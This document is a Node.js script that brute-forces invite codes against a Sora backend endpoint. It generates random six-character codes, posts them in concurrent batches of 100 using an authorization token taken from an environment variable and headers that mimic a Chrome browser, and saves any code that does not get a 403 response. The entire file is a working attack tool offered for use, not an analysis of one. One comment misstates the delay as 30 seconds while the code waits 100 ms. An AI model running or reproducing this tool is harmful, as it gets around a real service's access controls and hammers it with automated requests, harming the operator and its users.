const fs = require('fs').promises;
const path = require('path');
const axios = require('axios');
const dotenv = require('dotenv').config()

const TRIED_FILE = 'tried_codes.json';
const LEGACY_SUCCESS_FILE = 'success_codes.json';

const todayTagUTC = () => new Date().toISOString().slice(0, 10).replace(/-/g, '');

const SUCCESS_FILE = `success_codes_${todayTagUTC()}.json`;
const BASE_URL = 'https://sora.chatgpt.com/backend/project_y/invite/accept';

const HEADERS = {
  accept: '*/*',
  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
  authorization: process.env.HTTP_AUTHORIZATION_HEADER,
  'content-type': 'application/json',
  'oai-device-id': 'a97f5433-ea90-47b9-8475-af334139ee0b',
  priority: 'u=1, i',
  'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin'
};

const generateRandomCode = () => {
  const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
};

const loadTriedCodes = async () => {
  try {
    const data = await fs.readFile(TRIED_FILE, 'utf8');
    return new Set(JSON.parse(data));
  } catch (error) {
    return new Set();
  }
};

const saveTriedCodes = async (triedCodes) => {
  await fs.writeFile(TRIED_FILE, JSON.stringify(Array.from(triedCodes), null, 2));
};

const loadSuccessCodes = async () => {
  try {
    const data = await fs.readFile(SUCCESS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    if (error.code === 'ENOENT') {
      try {
        const legacyData = await fs.readFile(LEGACY_SUCCESS_FILE, 'utf8');
        const legacyCodes = JSON.parse(legacyData);
        await fs.writeFile(SUCCESS_FILE, JSON.stringify(legacyCodes, null, 2));
        return legacyCodes;
      } catch (legacyError) {
        if (legacyError.code !== 'ENOENT') {
          console.warn(`Unable to read legacy success file: ${legacyError.message}`);
        }
        return [];
      }
    }

    console.warn(`Unable to read success file ${SUCCESS_FILE}: ${error.message}`);
    return [];
  }
};

const saveSuccessCode = async (code) => {
  // 使用互斥锁确保同一时间只有一个写入操作
  saveSuccessLock = saveSuccessLock.then(async () => {
    const successes = await loadSuccessCodes();
    if (!successes.includes(code)) {
      successes.push(code);
      await fs.writeFile(SUCCESS_FILE, JSON.stringify(successes, null, 2));
    }

    if (LEGACY_SUCCESS_FILE !== SUCCESS_FILE) {
      try {
        await fs.unlink(LEGACY_SUCCESS_FILE);
      } catch (error) {
        if (error.code !== 'ENOENT') {
          console.warn(`Unable to remove legacy success file: ${error.message}`);
        }
      }
    }
  }).catch((error) => {
      console.error('Failed to save success code:', error);
  });

  return saveSuccessLock;
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 简单的互斥锁实现
let saveSuccessLock = Promise.resolve();

const tryInviteCode = async (code) => {
  try {
    const response = await axios.post(BASE_URL, { invite_code: code }, { headers: HEADERS, timeout: 30000 });
    return response.status;
  } catch (error) {
    return error.response ? error.response.status : 0;
  }
};

const main = async () => {
  console.log('Starting invite code brute force...');
  let triedCodes = await loadTriedCodes();
  const batchSize = 100;

  while (true) {
    const batch = new Set();
    while (batch.size < batchSize) {
      const code = generateRandomCode();
      if (!triedCodes.has(code) && !batch.has(code)) {
        batch.add(code);
      }
    }

    const batchArray = Array.from(batch);
    let foundSuccess = false;

    await Promise.all(batchArray.map(async (code) => {
      console.log(`Attempting code: ${code}`);
      const status = await tryInviteCode(code);
      if (status !== 403) {
        console.log(`Success! Code ${code} returned status ${status}. Saving...`);
        await saveSuccessCode(code);
        foundSuccess = true;
      } else {
        // console.log(`Code ${code} failed (403).`);
        triedCodes.add(code);
      }
      await delay(100); // 30 seconds delay after each attempt
    }));

    await saveTriedCodes(triedCodes);

    if (foundSuccess) {
      console.log('Found a successful code. Exiting.');
      break;
    }
  }
};

main().catch(console.error);